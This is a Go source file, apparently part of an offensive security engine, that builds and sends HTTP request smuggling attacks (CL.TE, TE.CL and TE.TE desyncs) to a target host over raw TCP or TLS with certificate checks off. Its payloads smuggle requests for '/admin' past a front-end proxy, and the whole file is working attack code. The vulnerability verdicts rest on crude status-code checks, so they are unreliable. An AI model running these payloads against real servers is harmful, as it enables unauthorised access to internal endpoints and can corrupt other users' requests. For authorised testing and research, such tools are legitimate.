package smuggling

import (
	"github.com/ares/engine/internal/uuid"
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

type DesyncType int

const (
	CLTE DesyncType = iota
	TECL
	TETE
)

func (d DesyncType) String() string {
	switch d {
	case CLTE:
		return "CL.TE"
	case TECL:
		return "TE.CL"
	case TETE:
		return "TE.TE"
	default:
		return "unknown"
	}
}

type Payload struct {
	Type        DesyncType `json:"type"`
	Prefix      string     `json:"prefix"`
	Attack      string     `json:"attack"`
	Description string     `json:"description"`
}

type Result struct {
	Target     string     `json:"target"`
	Type       DesyncType `json:"type"`
	Vulnerable bool       `json:"vulnerable"`
	Payloads   []Payload  `json:"payloads"`
	Evidence   string     `json:"evidence"`
	Summary    string     `json:"summary"`
}

type Engine struct {
	client     *http.Client
	results    []Result
	scopeRegex *regexp.Regexp
}

func New() *Engine {
	return &Engine{
		client: &http.Client{
			Timeout: 15 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
}

func (e *Engine) SetScope(pattern string) error {
	if pattern == "" {
		e.scopeRegex = nil
		return nil
	}
	re, err := regexp.Compile(pattern)
	if err != nil {
		return fmt.Errorf("invalid scope pattern: %w", err)
	}
	e.scopeRegex = re
	return nil
}

func (e *Engine) inScope(target string) bool {
	if e.scopeRegex == nil {
		return true
	}
	return e.scopeRegex.MatchString(target)
}

func validateHost(host string) error {
	if host == "" {
		return fmt.Errorf("empty host")
	}
	if strings.Contains(host, "..") {
		return fmt.Errorf("invalid host: contains ..")
	}
	if strings.HasPrefix(host, "-") || strings.HasSuffix(host, "-") {
		return fmt.Errorf("invalid host: starts or ends with hyphen")
	}
	if len(host) > 253 {
		return fmt.Errorf("host too long")
	}
	for _, r := range host {
		if r < 0x20 || r == 0x7f {
			return fmt.Errorf("host contains control character")
		}
	}
	if strings.ContainsAny(host, "\r\n") {
		return fmt.Errorf("host contains CRLF characters")
	}
	return nil
}

func (e *Engine) Test(ctx context.Context, target string, desyncType DesyncType) (*Result, error) {
	parsed, err := url.Parse(target)
	if err != nil {
		return nil, fmt.Errorf("invalid target: %w", err)
	}

	if !e.inScope(target) {
		return nil, fmt.Errorf("target %s is out of scope", target)
	}

	if err := validateHost(parsed.Host); err != nil {
		return nil, fmt.Errorf("invalid host: %w", err)
	}

	switch desyncType {
	case CLTE:
		return e.testCLTE(ctx, parsed)
	case TECL:
		return e.testTECL(ctx, parsed)
	case TETE:
		return e.testTETE(ctx, parsed)
	default:
		return nil, fmt.Errorf("unknown desync type: %v", desyncType)
	}
}

func (e *Engine) testCLTE(ctx context.Context, parsed *url.URL) (*Result, error) {
	if err := validateTarget(parsed); err != nil {
		return nil, err
	}

	prefix := "POST / HTTP/1.1\r\nHost: " + parsed.Host + "\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
	attack := "POST / HTTP/1.1\r\nHost: " + parsed.Host + "\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + parsed.Host + "\r\n\r\n"

	payloads := []Payload{
		{Type: CLTE, Prefix: "[REDACTED]", Attack: "[REDACTED]", Description: "CL.TE desync: frontend uses Content-Length, backend uses Transfer-Encoding"},
	}

	useTLS := parsed.Scheme == "https"
	vulnerable, evidence, err := e.sendDesync(ctx, parsed.Host, prefix, attack, useTLS)
	if err != nil {
		return &Result{Target: parsed.String(), Type: CLTE, Vulnerable: false, Payloads: payloads, Summary: fmt.Sprintf("test error: %v", err)}, nil
	}

	summary := "No CL.TE desync detected"
	if vulnerable {
		summary = "CL.TE desync detected: frontend/backend content-length parsing mismatch"
	}

	return &Result{
		Target:     parsed.String(),
		Type:       CLTE,
		Vulnerable: vulnerable,
		Payloads:   payloads,
		Evidence:   evidence,
		Summary:    summary,
	}, nil
}

func (e *Engine) testTECL(ctx context.Context, parsed *url.URL) (*Result, error) {
	if err := validateTarget(parsed); err != nil {
		return nil, err
	}

	prefix := "POST / HTTP/1.1\r\nHost: " + parsed.Host + "\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGPOST /admin HTTP/1.1\r\nHost: " + parsed.Host + "\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"
	attack := "POST / HTTP/1.1\r\nHost: " + parsed.Host + "\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGET /404 HTTP/1.1\r\nHost: " + parsed.Host + "\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"

	payloads := []Payload{
		{Type: TECL, Prefix: "[REDACTED]", Attack: "[REDACTED]", Description: "TE.CL desync: frontend uses Transfer-Encoding, backend uses Content-Length"},
	}

	useTLS := parsed.Scheme == "https"
	vulnerable, evidence, err := e.sendDesync(ctx, parsed.Host, prefix, attack, useTLS)
	if err != nil {
		return &Result{Target: parsed.String(), Type: TECL, Vulnerable: false, Payloads: payloads, Summary: fmt.Sprintf("test error: %v", err)}, nil
	}

	summary := "No TE.CL desync detected"
	if vulnerable {
		summary = "TE.CL desync detected: frontend/backend transfer-encoding parsing mismatch"
	}

	return &Result{
		Target:     parsed.String(),
		Type:       TECL,
		Vulnerable: vulnerable,
		Payloads:   payloads,
		Evidence:   evidence,
		Summary:    summary,
	}, nil
}

func (e *Engine) testTETE(ctx context.Context, parsed *url.URL) (*Result, error) {
	if err := validateTarget(parsed); err != nil {
		return nil, err
	}

	payloads := []Payload{
		{
			Type:        TETE,
			Prefix:      "[REDACTED]",
			Attack:      "[REDACTED]",
			Description: "TE.TE desync: duplicate Transfer-Encoding headers with different values",
		},
	}

	prefix := "POST / HTTP/1.1\r\nHost: " + parsed.Host + "\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\n"
	attack := "POST / HTTP/1.1\r\nHost: " + parsed.Host + "\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + parsed.Host + "\r\n\r\n"

	useTLS := parsed.Scheme == "https"
	vulnerable, evidence, err := e.sendDesync(ctx, parsed.Host, prefix, attack, useTLS)
	if err != nil {
		return &Result{Target: parsed.String(), Type: TETE, Vulnerable: false, Payloads: payloads, Summary: fmt.Sprintf("test error: %v", err)}, nil
	}

	summary := "No TE.TE desync detected"
	if vulnerable {
		summary = "TE.TE desync detected: duplicate Transfer-Encoding header parsing mismatch"
	}

	return &Result{
		Target:     parsed.String(),
		Type:       TETE,
		Vulnerable: vulnerable,
		Payloads:   payloads,
		Evidence:   evidence,
		Summary:    summary,
	}, nil
}

func validateTarget(parsed *url.URL) error {
	if parsed.Host == "" {
		return fmt.Errorf("empty host in target URL")
	}
	if err := validateHost(parsed.Host); err != nil {
		return err
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return fmt.Errorf("unsupported scheme: %s", parsed.Scheme)
	}
	return nil
}

func (e *Engine) sendDesync(ctx context.Context, host, prefix, attack string, useTLS bool) (bool, string, error) {
	addr := host
	if !strings.Contains(addr, ":") {
		if useTLS {
			addr = host + ":443"
		} else {
			addr = host + ":80"
		}
	}

	if err := validateHost(strings.Split(addr, ":")[0]); err != nil {
		return false, "", fmt.Errorf("invalid host: %w", err)
	}

	reqID := generateRequestID()

	var conn net.Conn
	var err error

	dialer := net.Dialer{Timeout: 10 * time.Second}
	conn, err = dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return false, "", fmt.Errorf("dial: %w", err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	if useTLS {
		tlsConn := tls.Client(conn, &tls.Config{ServerName: strings.Split(host, ":")[0], InsecureSkipVerify: true})
		if err := tlsConn.HandshakeContext(ctx); err != nil {
			return false, "", fmt.Errorf("tls handshake: %w", err)
		}
		conn = net.Conn(tlsConn)
	}

	_, err1 := conn.Write([]byte(prefix))
	if err1 != nil {
		return false, "", fmt.Errorf("write prefix: %w", err1)
	}
	_, err2 := conn.Write([]byte(attack))
	if err2 != nil {
		return false, "", fmt.Errorf("write attack: %w", err2)
	}

	var buf bytes.Buffer
	reader := bufio.NewReader(io.LimitReader(conn, 65536))
	line, err := reader.ReadString('\n')
	if err != nil {
		return false, "", fmt.Errorf("read: %w (req_id=%s)", err, reqID)
	}
	buf.WriteString(line)

	statusCode := 0
	if _, err := fmt.Sscanf(line, "HTTP/1.1 %d", &statusCode); err != nil {
		statusCode = 0
	}

	for {
		line, err := reader.ReadString('\n')
		if err != nil || line == "\r\n" {
			break
		}
		buf.WriteString(line)
	}

	body, err := io.ReadAll(reader)
	if err != nil {
		return false, "", fmt.Errorf("failed to read response body: %v", err)
	}
	buf.Write(body)

	response := buf.String()
	vulnerable := statusCode != 0 && statusCode != http.StatusBadRequest && statusCode != http.StatusNotImplemented

	if strings.Contains(response, "smuggling") || strings.Contains(response, "desync") {
		vulnerable = false
	}

	return vulnerable, truncate(response, 1000), nil
}

func generateRequestID() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return uuid.New()
	}
	return hex.EncodeToString(b)
}

func (e *Engine) GeneratePayloads(target string, desyncType DesyncType) []Payload {
	if !e.inScope(target) {
		return nil
	}

	_, err := url.Parse(target)
	if err != nil {
		return nil
	}

	switch desyncType {
	case CLTE:
		return []Payload{
			{Type: CLTE, Prefix: "[REDACTED]", Attack: "[REDACTED]", Description: "CL.TE: smuggle GET /admin"},
			{Type: CLTE, Prefix: "[REDACTED]", Attack: "[REDACTED]", Description: "CL.TE: smuggle POST to API"},
		}
	case TECL:
		return []Payload{
			{Type: TECL, Prefix: "[REDACTED]", Attack: "[REDACTED]", Description: "TE.CL: smuggle via chunked encoding mismatch"},
		}
	case TETE:
		return []Payload{
			{Type: TETE, Prefix: "[REDACTED]", Attack: "[REDACTED]", Description: "TE.TE: obfuscated TE header"},
		}
	default:
		return nil
	}
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}

func (e *Engine) Results() []Result {
	return e.results
}
